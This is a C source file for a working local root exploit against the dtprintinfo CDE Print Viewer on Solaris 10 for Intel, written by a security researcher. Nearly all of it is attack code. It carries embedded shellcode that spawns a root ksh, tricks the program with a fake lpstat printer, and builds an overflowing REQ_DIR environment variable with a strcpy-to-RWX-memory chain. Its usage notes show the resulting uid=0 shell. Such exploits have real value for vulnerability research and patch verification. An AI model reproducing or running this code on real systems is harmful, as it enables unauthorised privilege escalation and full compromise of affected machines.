/*
 * raptor_dtprintcheckdir_intel.c - Solaris/Intel 0day? LPE
 * Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * "What we do in life echoes in eternity" -- Maximus Decimus Meridius
 * https://patchfriday.com/22/
 *
 * Another buffer overflow in the dtprintinfo(1) CDE Print Viewer, leading to
 * local root. This one was discovered by Marti Guasch Jimenez, who attended my
 * talk "A bug's life: story of a Solaris 0day" presented at #INFILTRATE19 on
 * May 2nd, 2019 (https://github.com/0xdea/raptor_infiltrate19).
 *
 * It's a stack-based buffer overflow in the check_dir() function:
 * void __0FJcheck_dirPcTBPPP6QStatusLineStructPii(...){
 *     char local_724 [300];
 *     ...
 *     __format = getenv("REQ_DIR");
 *     sprintf(local_724,__format,param_2);
 *
 * "To trigger this vulnerability we need a printer present, we can also fake
 * it with the lpstat trick. We also need at least one directory in the path
 * pointed by the environment variable TMP_DIR. Finally, we just need to set
 * REQ_DIR with a value of 0x720 of padding + value to overwrite EBP + value to
 * overwrite EIP." -- Marti Guasch Jimenez
 *
 * This bug was likely fixed during the general cleanup of CDE code done by
 * Oracle in response to my recently reported vulnerabilities. However, I can't
 * confirm this because I have no access to their patches:/
 *
 * Usage:
 * $ gcc raptor_dtprintcheckdir_intel.c -o raptor_dtprintcheckdir_intel -Wall
 * [on your xserver: disable the access control]
 * $ ./raptor_dtprintcheckdir_intel 192.168.1.1:0
 * [on your xserver: double click on the fake "fnord" printer]
 * [...]
 * # id
 * uid=0(root) gid=1(other)
 * #
 *
 * Tested on:
 * SunOS 5.10 Generic_147148-26 i86pc i386 i86pc (Solaris 10 1/13)
 * [previous Solaris versions are also likely vulnerable]
 */

#include <fcntl.h>
#include <link.h>
#include <procfs.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/systeminfo.h>
#include <sys/types.h>

#define INFO1	"raptor_dtprintcheckdir_intel.c - Solaris/Intel 0day? LPE"
#define INFO2	"Copyright (c) 2020 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN	"/usr/dt/bin/dtprintinfo"	// the vulnerable program
#define	BUFSIZE	2048				// size of the evil env var

char sc[] = /* Solaris/x86 shellcode (8 + 8 + 27 = 43 bytes) */
/* double setuid() */
"\x31\xc0\x50\x50\xb0\x17\xcd\x91"
"\x31\xc0\x50\x50\xb0\x17\xcd\x91"
/* execve() */
"\x31\xc0\x50\x68/ksh\x68/bin"
"\x89\xe3\x50\x53\x89\xe2\x50"
"\x52\x53\xb0\x3b\x50\xcd\x91";

/* globals */
char	*arg[2] = {"foo", NULL};
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int	add_env(char *string);
void	check_zero(int addr, char *pattern);
int	get_sc_addr(char *path, char **argv);
int	search_ldso(char *sym);
int	search_rwx_mem(void);
void	set_val(char *buf, int pos, int val);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char	buf[BUFSIZE];
	char	platform[256], release[256], display[256];
	int	i, sc_addr;

	int	sb = ((int)argv[0] | 0xfff);	/* stack base */
	int	ret = search_ldso("strcpy");	/* or sprintf */
	int	rwx_mem = search_rwx_mem();	/* rwx memory */

	/* lpstat code to add a fake printer */
	if (!strcmp(argv[0], "lpstat")) {

		/* check command line */
		if (argc != 2)
			exit(1);

		/* print the expected output and exit */
		if(!strcmp(argv[1], "-v")) {
			fprintf(stderr, "lpstat called with -v\n");
			printf("device for fnord: /dev/null\n");
		} else {
			fprintf(stderr, "lpstat called with -d\n");
			printf("system default destination: fnord\n");
		}
		exit(0);
	}

	/* helper program that prints argv[0] address, used by get_sc_addr() */
	if (!strcmp(argv[0], "foo")) {
		printf("0x%p\n", argv[0]);
		exit(0);
	}

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* process command line */
	if (argc != 2) {
		fprintf(stderr, "usage: %s xserver:display\n\n", argv[0]);
		exit(1);
	}
	sprintf(display, "DISPLAY=%s", argv[1]);

	/* prepare the evil env var */
	memset(buf, 'A', sizeof(buf));
	buf[sizeof(buf) - 1] = 0x0;
	memcpy(buf, "REQ_DIR=", 8);

	/* fill the envp, keeping padding */
	add_env(sc);
	add_env(buf);
	add_env(display);
	add_env("TMP_DIR=/tmp");
	add_env("PATH=.:/usr/bin");
	add_env("HOME=/tmp");
	add_env(NULL);

	/* calculate the shellcode address */
	sc_addr = get_sc_addr(VULN, argv);

	/* fill with ld.so.1 address, saved eip, and arguments */
	for (i = 12; i < BUFSIZE - 20; i += 4) {
		set_val(buf, i, ret);		/* strcpy */
		set_val(buf, i += 4, rwx_mem);	/* saved eip */
		set_val(buf, i += 4, rwx_mem);	/* 1st argument */
		set_val(buf, i += 4, sc_addr);	/* 2nd argument */
	}

	/* we need at least one directory inside TMP_DIR to trigger the bug */
	mkdir("/tmp/one_dir", S_IRWXU | S_IRWXG | S_IRWXO);

	/* create a symlink for the fake lpstat */
	unlink("lpstat");
	symlink(argv[0], "lpstat");

	/* print some output */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	fprintf(stderr, "Using rwx_mem address\t: 0x%p\n", (void *)rwx_mem);
	fprintf(stderr, "Using sc address\t: 0x%p\n", (void *)sc_addr);
	fprintf(stderr, "Using strcpy() address\t: 0x%p\n\n", (void *)ret);

        /* check for null bytes */
        check_zero(sc_addr, "sc address");

	/* run the vulnerable program */
	execve(VULN, arg, env);
	perror("execve");
	exit(1);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return env_len;
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return env_len;
}

/*
 * check_zero(): check an address for the presence of a 0x00
 */
void check_zero(int addr, char *pattern)
{
	if (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
	    !(addr & 0xff000000)) {
		fprintf(stderr, "Error: %s contains a 0x00!\n", pattern);
		exit(1);
	}
}

/*
 * get_sc_addr(): get shellcode address using a helper program
 */
int get_sc_addr(char *path, char **argv)
{
	char	prog[] = "./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	char	hex[11] = "\x00";
	int	fd[2], addr;

        /* truncate program name at correct length and create a hard link */
	prog[strlen(path)] = 0x0;
	unlink(prog);
	link(argv[0], prog);

        /* open pipe to read program output */
	if (pipe(fd) < 0) {
		perror("pipe");
		exit(1);
	}

	switch(fork()) {

	case -1: /* cannot fork */
		perror("fork");
		exit(1);

	case 0: /* child */
		dup2(fd[1], 1);
		close(fd[0]);
		close(fd[1]);
		execve(prog, arg, env);
		perror("execve");
		exit(1);

	default: /* parent */
		close(fd[1]);
		read(fd[0], hex, sizeof(hex));
		break;
	}

	/* check and return address */
	if (!(addr = (int)strtoul(hex, (char **)NULL, 0))) {
		fprintf(stderr, "error: cannot read sc address from helper program\n");
		exit(1);
	}
	return addr;
}

/*
 * search_ldso(): search for a symbol inside ld.so.1
 */
int search_ldso(char *sym)
{
	int		addr;
	void		*handle;
	Link_map	*lm;

	/* open the executable object file */
	if ((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL) {
		perror("dlopen");
		exit(1);
	}

	/* get dynamic load information */
	if ((dlinfo(handle, RTLD_DI_LINKMAP, &lm)) == -1) {
		perror("dlinfo");
		exit(1);
	}

	/* search for the address of the symbol */
	if ((addr = (int)dlsym(handle, sym)) == NULL) {
		fprintf(stderr, "sorry, function %s() not found\n", sym);
		exit(1);
	}

	/* close the executable object file */
	dlclose(handle);

	check_zero(addr - 4, sym);
	return addr;
}

/*
 * search_rwx_mem(): search for an RWX memory segment valid for all
 * programs (typically, /usr/lib/ld.so.1) using the proc filesystem
 */
int search_rwx_mem(void)
{
	int	fd;
	char	tmp[16];
	prmap_t	map;
	int	addr = 0, addr_old;

	/* open the proc filesystem */
	sprintf(tmp,"/proc/%d/map", (int)getpid());
	if ((fd = open(tmp, O_RDONLY)) < 0) {
		fprintf(stderr, "can't open %s\n", tmp);
		exit(1);
	}

	/* search for the last RWX memory segment before stack (last - 1) */
	while (read(fd, &map, sizeof(map)))
		if (map.pr_vaddr)
			if (map.pr_mflags & (MA_READ | MA_WRITE | MA_EXEC)) {
				addr_old = addr;
				addr = map.pr_vaddr;
			}
	close(fd);

	/* add 4 to the exact address null bytes */
	if (!(addr_old & 0xff))
		addr_old |= 0x04;
	if (!(addr_old & 0xff00))
		addr_old |= 0x0400;

	return addr_old;
}

/*
 * set_val(): copy a dword inside a buffer (little endian)
 */
void set_val(char *buf, int pos, int val)
{
	buf[pos] =	(val & 0x000000ff);
	buf[pos + 1] =	(val & 0x0000ff00) >> 8;
	buf[pos + 2] =	(val & 0x00ff0000) >> 16;
	buf[pos + 3] =	(val & 0xff000000) >> 24;
}
